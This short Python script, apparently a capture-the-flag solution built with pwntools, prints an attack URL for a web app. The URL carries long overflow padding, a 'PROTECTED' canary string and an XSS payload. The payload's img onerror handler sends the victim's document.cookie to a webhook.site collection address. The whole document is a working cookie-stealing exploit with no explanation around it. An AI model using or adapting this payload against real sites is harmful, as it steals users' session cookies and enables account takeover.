from pwn import *
canary = "PROTECTED"
print("http://app/#"+("A"*(1024))+canary.ljust(16,"A")+"<img src=x onerror='location=`https://webhook.site/9d7bb9b9-c05a-4264-9f23-bc3c030b7e9a?${document.cookie}`'>")
